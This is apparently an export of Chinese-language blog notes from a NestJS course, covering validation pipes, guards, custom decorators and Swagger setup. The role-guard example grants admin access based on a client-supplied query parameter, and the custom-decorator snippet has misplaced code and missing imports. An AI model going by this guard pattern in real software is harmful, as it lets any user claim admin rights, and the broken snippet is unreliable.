class="meta">@Controller</span>(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">PController</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">private</span> <span class="keyword">readonly</span> pService: PService</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Get</span>(<span class="string">&#x27;:id&#x27;</span>)</span><br><span class="line">  <span class="comment">// 有时后台想接收number数据而不是string，此时可以用管道转换</span></span><br><span class="line">  <span class="title function_">findOne</span>(<span class="params"><span class="meta">@Param</span>(<span class="string">&#x27;id&#x27;</span>, ParseIntPipe) id: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> id); <span class="comment">// -&gt;number，默认时应该是string</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">pService</span>.<span class="title function_">findOne</span>(+id);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="管道验证DTO"><a href="#管道验证DTO" class="headerlink" title="管道验证DTO"></a>管道验证DTO</h1><p>使用<code>nest g res [实体名]</code>创建一套crud模板时，nest会默认创建好该实体的DTO文件，它可以用于约束实体</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">CreateLoginDto</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>使用<code>nest g pi [实体名]</code>可以创建该实体的pipe文件</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">ArgumentMetadata</span>, <span class="title class_">Injectable</span>, <span class="title class_">PipeTransform</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">LoginPipe</span> <span class="keyword">implements</span> <span class="title class_">PipeTransform</span> &#123;</span><br><span class="line">  <span class="comment">// value：前台传的数据   metadata：元数据，包括参数类型、装饰器类型、装饰器的值</span></span><br><span class="line">  <span class="title function_">transform</span>(<span class="params">value: <span class="built_in">any</span>, metadata: ArgumentMetadata</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>安装验证器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm i --save class-validator class-transformer</span><br></pre></td></tr></table></figure>

<p>在DTO中定义数据的约束：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">IsNotEmpty</span>, <span class="title class_">IsString</span>, <span class="title class_">Length</span>, <span class="title class_">IsNumber</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;class-validator&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">CreateLoginDto</span> &#123;</span><br><span class="line">  <span class="meta">@IsNotEmpty</span>()</span><br><span class="line">  <span class="meta">@IsString</span>()</span><br><span class="line">  <span class="meta">@Length</span>(<span class="number">5</span>, <span class="number">10</span>, &#123;</span><br><span class="line">    <span class="attr">message</span>: <span class="string">&#x27;字数越界&#x27;</span>,</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="meta">@IsNumber</span>()</span><br><span class="line">  <span class="attr">age</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在pipe中验证数据：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  <span class="title class_">ArgumentMetadata</span>,</span><br><span class="line">  <span class="title class_">HttpException</span>,</span><br><span class="line">  <span class="title class_">HttpStatus</span>,</span><br><span class="line">  <span class="title class_">Injectable</span>,</span><br><span class="line">  <span class="title class_">PipeTransform</span>,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; plainToInstance &#125; <span class="keyword">from</span> <span class="string">&#x27;class-transformer&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; validate &#125; <span class="keyword">from</span> <span class="string">&#x27;class-validator&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">LoginPipe</span> <span class="keyword">implements</span> <span class="title class_">PipeTransform</span> &#123;</span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">transform</span>(<span class="params">value: <span class="built_in">any</span>, metadata: ArgumentMetadata</span>) &#123;</span><br><span class="line">    <span class="comment">// plainToInstance会将值反射到DTO上</span></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">DTO</span> = <span class="title function_">plainToInstance</span>(metadata.<span class="property">metatype</span>, value);</span><br><span class="line">    <span class="comment">// 验证数据，异步操作，如果有错误，会把所有错误以数组形式返回</span></span><br><span class="line">    <span class="keyword">const</span> errors = <span class="keyword">await</span> <span class="title function_">validate</span>(<span class="variable constant_">DTO</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(errors);</span><br><span class="line">    <span class="comment">// 如果有错误，抛出</span></span><br><span class="line">    <span class="keyword">if</span> (errors.<span class="property">length</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">HttpException</span>(errors, <span class="title class_">HttpStatus</span>.<span class="property">BAD_REQUEST</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在controller中应用验证：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  <span class="title class_">Controller</span>,</span><br><span class="line">  <span class="title class_">Post</span>,</span><br><span class="line">  <span class="title class_">Body</span>,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">LoginService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./login.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">CreateLoginDto</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./dto/create-login.dto&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">UpdateLoginDto</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./dto/update-login.dto&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">LoginPipe</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./login.pipe&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">&#x27;login&#x27;</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">LoginController</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">private</span> <span class="keyword">readonly</span> loginService: LoginService</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Post</span>()</span><br><span class="line">  <span class="comment">// 管道直接塞进装饰器里就能用</span></span><br><span class="line">  <span class="title function_">create</span>(<span class="params"><span class="meta">@Body</span>(LoginPipe) createLoginDto: CreateLoginDto</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">loginService</span>.<span class="title function_">create</span>(createLoginDto);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>nest为了用户方便，提供了简便应用数据验证的方式，就是使用nest提供的验证api在main.ts里全局注册：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NestFactory</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/core&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">VersioningType</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.module&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NestExpressApplication</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/platform-express&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">ValidationPipe</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">bootstrap</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> app = <span class="keyword">await</span> <span class="title class_">NestFactory</span>.<span class="property">create</span>&lt;<span class="title class_">NestExpressApplication</span>&gt;(<span class="title class_">AppModule</span>, &#123;</span><br><span class="line">    <span class="attr">cors</span>: <span class="literal">true</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  app.<span class="title function_">enableVersioning</span>(&#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">VersioningType</span>.<span class="property">URI</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// 应用数据约束检测，这样也不用在controller的装饰器里塞管道了</span></span><br><span class="line">  app.<span class="title function_">useGlobalPipes</span>(<span class="keyword">new</span> <span class="title class_">ValidationPipe</span>());</span><br><span class="line">  <span class="keyword">await</span> app.<span class="title function_">listen</span>(<span class="number">3000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">bootstrap</span>();</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nestjs</tag>
      </tags>
  </entry>
  <entry>
    <title>守卫</title>
    <url>/web/study/Nestjs/15.%E5%AE%88%E5%8D%AB.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1NG41187Bs/?spm_id_from=333.999.0.0">Nestjs 全家桶系列</a></p>
<h1 id="守卫"><a href="#守卫" class="headerlink" title="守卫"></a>守卫</h1><p>守卫根据运行时出现的某些条件（例如权限，角色，访问控制列表等）来确定给定的请求是否由路由处理程序处理，这通常称为授权</p>
<p>在传统的Express应用程序中，通常由中间件处理授权（以及认证）；中间件是身份验证的良好选择，因为诸如token验证或添加属性到request对象上与特定路由（及其元数据）没有强关联</p>
<blockquote>
<p>守卫在每个中间件之后执行，在任何拦截器或管道之前执行</p>
<p>执行顺序：中间件→守卫→拦截器→管道</p>
</blockquote>
<h1 id="使用守卫"><a href="#使用守卫" class="headerlink" title="使用守卫"></a>使用守卫</h1><p>创建一个守卫：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nest g gu [name]</span><br></pre></td></tr></table></figure>

<p>创建后：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">CanActivate</span>, <span class="title class_">ExecutionContext</span>, <span class="title class_">Injectable</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Observable</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;rxjs&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">RoleGuard</span> <span class="keyword">implements</span> <span class="title class_">CanActivate</span> &#123;</span><br><span class="line">  <span class="title function_">canActivate</span>(</span><br><span class="line">    <span class="attr">context</span>: <span class="title class_">ExecutionContext</span>,</span><br><span class="line">  ): <span class="built_in">boolean</span> | <span class="title class_">Promise</span>&lt;<span class="built_in">boolean</span>&gt; | <span class="title class_">Observable</span>&lt;<span class="built_in">boolean</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Controller使用守卫"><a href="#Controller使用守卫" class="headerlink" title="Controller使用守卫"></a>Controller使用守卫</h2><p>使用@UseGuards应用守卫</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  <span class="title class_">Controller</span>,</span><br><span class="line">  <span class="title class_">Get</span>,</span><br><span class="line">  <span class="title class_">UseGuards</span>,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">GuardService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./guard.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">RoleGuard</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./role/role.guard&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">&#x27;guard&#x27;</span>)</span><br><span class="line"><span class="comment">// 使用路由守卫</span></span><br><span class="line"><span class="meta">@UseGuards</span>(<span class="title class_">RoleGuard</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">GuardController</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">private</span> <span class="keyword">readonly</span> guardService: GuardService</span>) &#123;&#125;</span><br><span class="line">    </span><br><span class="line">  <span class="meta">@Get</span>()</span><br><span class="line">  <span class="title function_">findAll</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">guardService</span>.<span class="title function_">findAll</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="全局守卫"><a href="#全局守卫" class="headerlink" title="全局守卫"></a>全局守卫</h2><p>在main.ts中注册全局守卫</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NestFactory</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/core&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">VersioningType</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.module&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NestExpressApplication</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/platform-express&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">RoleGuard</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./guard/role/role.guard&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">bootstrap</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> app = <span class="keyword">await</span> <span class="title class_">NestFactory</span>.<span class="property">create</span>&lt;<span class="title class_">NestExpressApplication</span>&gt;(<span class="title class_">AppModule</span>, &#123;</span><br><span class="line">    <span class="attr">cors</span>: <span class="literal">true</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  app.<span class="title function_">enableVersioning</span>(&#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="title class_">VersioningType</span>.<span class="property">URI</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// 使用全局守卫</span></span><br><span class="line">  app.<span class="title function_">useGlobalGuards</span>(<span class="keyword">new</span> <span class="title class_">RoleGuard</span>());</span><br><span class="line">  <span class="keyword">await</span> app.<span class="title function_">listen</span>(<span class="number">3000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">bootstrap</span>();</span><br></pre></td></tr></table></figure>

<h2 id="针对角色控制守卫"><a href="#针对角色控制守卫" class="headerlink" title="针对角色控制守卫"></a>针对角色控制守卫</h2><p>在Controller定义元信息：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  <span class="title class_">Controller</span>,</span><br><span class="line">  <span class="title class_">Get</span>,</span><br><span class="line">  <span class="title class_">UseGuards</span>,</span><br><span class="line">  <span class="title class_">SetMetadata</span>,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">GuardService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./guard.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">RoleGuard</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./role/role.guard&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">&#x27;guard&#x27;</span>)</span><br><span class="line"><span class="meta">@UseGuards</span>(<span class="title class_">RoleGuard</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">GuardController</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">private</span> <span class="keyword">readonly</span> guardService: GuardService</span>) &#123;&#125;</span><br><span class="line">    </span><br><span class="line">  <span class="meta">@Get</span>()</span><br><span class="line">  <span class="comment">// 设置元信息键值</span></span><br><span class="line">  <span class="comment">// 此处的含义是定义role（角色）信息，如果符合对应角色才允许访问</span></span><br><span class="line">  <span class="meta">@SetMetadata</span>(<span class="string">&#x27;role&#x27;</span>, [<span class="string">&#x27;admin&#x27;</span>])</span><br><span class="line">  <span class="title function_">findAll</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">guardService</span>.<span class="title function_">findAll</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在守卫安排判断逻辑：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">CanActivate</span>, <span class="title class_">ExecutionContext</span>, <span class="title class_">Injectable</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Observable</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;rxjs&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Reflector</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/core&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123; <span class="title class_">Request</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;express&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">RoleGuard</span> <span class="keyword">implements</span> <span class="title class_">CanActivate</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">private</span> Reflector: Reflector</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">canActivate</span>(</span><br><span class="line">    <span class="attr">context</span>: <span class="title class_">ExecutionContext</span>,</span><br><span class="line">  ): <span class="built_in">boolean</span> | <span class="title class_">Promise</span>&lt;<span class="built_in">boolean</span>&gt; | <span class="title class_">Observable</span>&lt;<span class="built_in">boolean</span>&gt; &#123;</span><br><span class="line">    <span class="comment">// 得到角色列表（元信息，键是role）</span></span><br><span class="line">    <span class="keyword">const</span> admin = <span class="variable language_">this</span>.<span class="property">Reflector</span>.<span class="property">get</span>&lt;<span class="built_in">string</span>[]&gt;(<span class="string">&#x27;role&#x27;</span>, context.<span class="title function_">getHandler</span>());</span><br><span class="line">    <span class="comment">// 得到此次请求的request</span></span><br><span class="line">    <span class="keyword">const</span> req = context.<span class="title function_">switchToHttp</span>().<span class="property">getRequest</span>&lt;<span class="title class_">Request</span>&gt;();</span><br><span class="line">    <span class="comment">// 得到请求中的role参数</span></span><br><span class="line">    <span class="keyword">const</span> role = req.<span class="property">query</span>.<span class="property">role</span>;</span><br><span class="line">    <span class="comment">// 判断role参数的角色是否符合访问要求</span></span><br><span class="line">    <span class="keyword">if</span> (admin.<span class="title function_">includes</span>(role <span class="keyword">as</span> <span class="built_in">string</span>)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>角色不符合权限：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202308061301799.png"></p>
<p>角色符合权限：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202308061301994.png"></p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nestjs</tag>
      </tags>
  </entry>
  <entry>
    <title>自定义装饰器</title>
    <url>/web/study/Nestjs/16.%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A3%85%E9%A5%B0%E5%99%A8.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1NG41187Bs/?spm_id_from=333.999.0.0">Nestjs 全家桶系列</a></p>
<p>Nestjs大量用到装饰器decorator，所以Nestjs也允许用户自定义装饰器</p>
<p>创建自定义装饰器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nest g d [name]</span><br></pre></td></tr></table></figure>

<p>实现：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">SetMetadata</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">Role</span> = (<span class="params">...args: <span class="built_in">string</span>[]</span>) =&gt; <span class="title class_">SetMetadata</span>(<span class="string">&#x27;role&#x27;</span>, args);</span><br><span class="line"></span><br><span class="line"><span class="comment">// data：外面传来的参数   ctx：上下文</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title class_">ReqUrl</span> = <span class="title function_">createParamDecorator</span>(</span><br><span class="line">  <span class="function">(<span class="params">data: <span class="built_in">string</span>, ctx: ExecutionContext</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> req = ctx.<span class="title function_">switchToHttp</span>().<span class="property">getRequest</span>&lt;<span class="title class_">Request</span>&gt;();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data, <span class="string">&#x27;data&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> req.<span class="property">url</span>;</span><br><span class="line">    <span class="comment">// 这个函数可以组合多个装饰器</span></span><br><span class="line">    <span class="comment">// return applyDecorators(Role, xxx, xxxx)</span></span><br><span class="line">  &#125;,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>在Controller中使用：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  <span class="title class_">Controller</span>,</span><br><span class="line">  <span class="title class_">Get</span>,</span><br><span class="line">  <span class="title class_">UseGuards</span>,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">GuardService</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./guard.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">RoleGuard</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./role/role.guard&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Role</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./role/role.decorator&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">&#x27;guard&#x27;</span>)</span><br><span class="line"><span class="comment">// 使用路由守卫</span></span><br><span class="line"><span class="meta">@UseGuards</span>(<span class="title class_">RoleGuard</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">GuardController</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"><span class="keyword">private</span> <span class="keyword">readonly</span> guardService: GuardService</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Get</span>()</span><br><span class="line">  <span class="comment">// 自定义装饰器</span></span><br><span class="line">  <span class="meta">@Role</span>(<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">  <span class="meta">@ReqUrl</span>(<span class="string">&#x27;I am data&#x27;</span>) <span class="attr">url</span>: <span class="built_in">string</span></span><br><span class="line">  <span class="title function_">findAll</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(url, <span class="string">&#x27;url&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">guardService</span>.<span class="title function_">findAll</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nestjs</tag>
      </tags>
  </entry>
  <entry>
    <title>Swagger接口文档</title>
    <url>/web/study/Nestjs/17.Swagger%E6%8E%A5%E5%8F%A3%E6%96%87%E6%A1%A3.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1NG41187Bs/?spm_id_from=333.999.0.0">Nestjs 全家桶系列</a></p>
<h1 id="Swagger"><a href="#Swagger" class="headerlink" title="Swagger"></a>Swagger</h1><p>Swagger用于给前端提供接口文档，而且每个接口都支持现场测试，<a href="https://swagger.io/">官网</a></p>
<p>安装依赖：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install  @nestjs/swagger swagger-ui-express</span><br></pre></td></tr></table></figure>

<h1 id="注册Swagger"><a href="#注册Swagger" class="headerlink" title="注册Swagger"></a>注册Swagger</h1><p>在main.ts注册：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NestFactory</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/core&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">VersioningType</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/common&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">AppModule</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;./app.module&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NestExpressApplication</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/platform-express&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">SwaggerModule</span>, <span class="title class_">DocumentBuilder</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@nestjs/swagger&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">bootstrap</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> app = <span class="keyword">await</span> <span class="title class_">NestFactory</span>.<span class="property">create</span>&lt;<span class="title class_">NestExpressApplication</span>&gt;(<span class="title class_">AppModule</span>, &#123;</span><br><span class="line">    <span class="attr">cors</span>: <span class="literal">true</span>,</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 配置项</span></span><br><span class="line">  <span class="keyword">const</span> options = <span class="keyword">new</span> <span class="title class_">DocumentBuilder</span>()</span><br><span class="line">    .<span class="title function_">setTitle</span>(<span class="string">&#x27;接口文档标题&#x27;</span>)</span><br><span class="line">    .<span class="title function_">setDescription</span>(<span class="string">&#x27;1145141919810&#x27;</span>)</span><br><span class="line">    .<span class="title function_">setVersion</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    .<span class="title function_">build</span>();</span><br><span class="line">  <span class="comment">// 创建</span></span><br><span class="line">  <span class="keyword">const</span> <span class="variable language_">document</span> = <span class="title class_">SwaggerModule</span>.<span class="title function_">createDocument</span>(app, options);</span><br><span class="line">  <span class="comment">// 初始化</span></span><br><span class="line">  <span class="title class_">SwaggerModule</span>.<span class="title function_">setup</span>(<span class="string">&#x27;/api-docs&#x27;</span>, app, <span class="variable language_">document</span>);</span><br><span class="line">  <span class="keyword">await</span> app.<span class="title function_">listen</span>(<span class="number">3000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">bootstrap</span>();</span><br></pre></td></tr></table></figure>

<p>生成了接口文档：</p>
